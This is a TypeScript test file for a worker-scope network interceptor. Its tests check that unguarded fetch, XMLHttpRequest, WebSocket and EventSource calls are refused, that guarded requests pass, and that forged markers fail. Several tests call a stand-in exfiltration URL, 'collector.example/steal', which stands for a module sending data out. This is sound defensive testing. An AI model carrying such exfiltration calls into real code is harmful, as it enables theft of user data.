/**
 * TEST-SECURITY-015 — worker-scope network interception (V-5).
 *
 * This is defence in depth and the tests are written to say so. The boundary
 * is that provider adapters are constructed with a guarded transport and that
 * tools declare their egress; this catches a module that reaches for a global
 * primitive anyway.
 *
 * Every test restores the globals it replaced, so one test cannot leave the
 * runner in a state where the next appears to pass for the wrong reason.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  GUARDED_REQUEST_MARKER,
  installNetworkInterceptor,
  markGuarded,
} from '@/security/egress/network-interceptor';

let restore: (() => void) | undefined;

afterEach(() => {
  restore?.();
  restore = undefined;
  vi.unstubAllGlobals();
});

describe('unauthorised primitives are refused', () => {
  it('refuses a bare fetch', async () => {
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    restore = installNetworkInterceptor();

    expect(() => globalThis.fetch('https://collector.example/steal')).toThrow(
      /outside the guarded transport/i,
    );
    expect(inner).not.toHaveBeenCalled();
  });

  it('refuses a fetch given a Request object rather than a string', async () => {
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    restore = installNetworkInterceptor();

    expect(() => globalThis.fetch(new Request('https://collector.example/steal'))).toThrow();
    expect(inner).not.toHaveBeenCalled();
  });

  it.each(['XMLHttpRequest', 'WebSocket', 'EventSource'] as const)('refuses %s', (name) => {
    vi.stubGlobal('fetch', vi.fn());
    vi.stubGlobal(name, function Original() {});
    restore = installNetworkInterceptor();

    const Constructor = (globalThis as unknown as Record<string, () => void>)[name]!;
    expect(() => Constructor()).toThrow(/outside the guarded transport/i);
  });
});

describe('the guarded transport passes', () => {
  it('lets a marked request through to the original primitive', async () => {
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    restore = installNetworkInterceptor();

    await globalThis.fetch('https://api.example.com/v1', markGuarded({ method: 'POST' }));
    expect(inner).toHaveBeenCalledTimes(1);
  });

  it('identifies the guarded call by a token, not by inspecting a stack', () => {
    const marked = markGuarded({ method: 'POST' }) as Record<symbol, unknown>;
    expect(marked[GUARDED_REQUEST_MARKER]).toBe(true);
  });

  it('does not treat a forged string property as the marker', async () => {
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    restore = installNetworkInterceptor();

    // A symbol cannot be produced by parsing attacker-supplied JSON, which is
    // why the marker is one.
    expect(() =>
      globalThis.fetch('https://collector.example/steal', {
        ...(JSON.parse('{"aiba.guarded-egress": true}') as Record<string, unknown>),
      }),
    ).toThrow();
    expect(inner).not.toHaveBeenCalled();
  });
});

describe('fail-closed and no false allow', () => {
  it('refuses when no allowlist is configured', () => {
    vi.stubGlobal('fetch', vi.fn());
    restore = installNetworkInterceptor();
    expect(() => globalThis.fetch('https://anything.example')).toThrow();
  });

  it('honours an explicit allowlist only for what it names', async () => {
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    restore = installNetworkInterceptor({ allow: (url) => url.startsWith('https://ok.example/') });

    await globalThis.fetch('https://ok.example/allowed');
    expect(inner).toHaveBeenCalledTimes(1);

    expect(() => globalThis.fetch('https://other.example/denied')).toThrow();
    expect(inner).toHaveBeenCalledTimes(1);
  });
});

describe('no unintended global side effects', () => {
  it('restores every primitive it replaced', () => {
    const originalFetch = vi.fn();
    function OriginalXhr(): void {}
    vi.stubGlobal('fetch', originalFetch);
    vi.stubGlobal('XMLHttpRequest', OriginalXhr);

    const undo = installNetworkInterceptor();
    expect(globalThis.fetch).not.toBe(originalFetch);

    undo();
    expect(globalThis.fetch).toBe(originalFetch);
    expect((globalThis as unknown as Record<string, unknown>).XMLHttpRequest).toBe(OriginalXhr);
  });

  it('leaves a primitive the environment does not have alone', () => {
    vi.stubGlobal('fetch', vi.fn());
    vi.stubGlobal('EventSource', undefined);
    restore = installNetworkInterceptor();
    expect((globalThis as unknown as Record<string, unknown>).EventSource).toBeUndefined();
  });

  it('is not the sole boundary — it can be removed and the transport still gates', async () => {
    // Stated as a test so the claim in the module header is checkable: with
    // interception undone, an unguarded fetch succeeds. That is precisely why
    // the guarded transport, not this, is the boundary.
    const inner = vi.fn(() => Promise.resolve(new Response('{}')));
    vi.stubGlobal('fetch', inner);
    const undo = installNetworkInterceptor();
    undo();

    await globalThis.fetch('https://anything.example');
    expect(inner).toHaveBeenCalledTimes(1);
  });
});
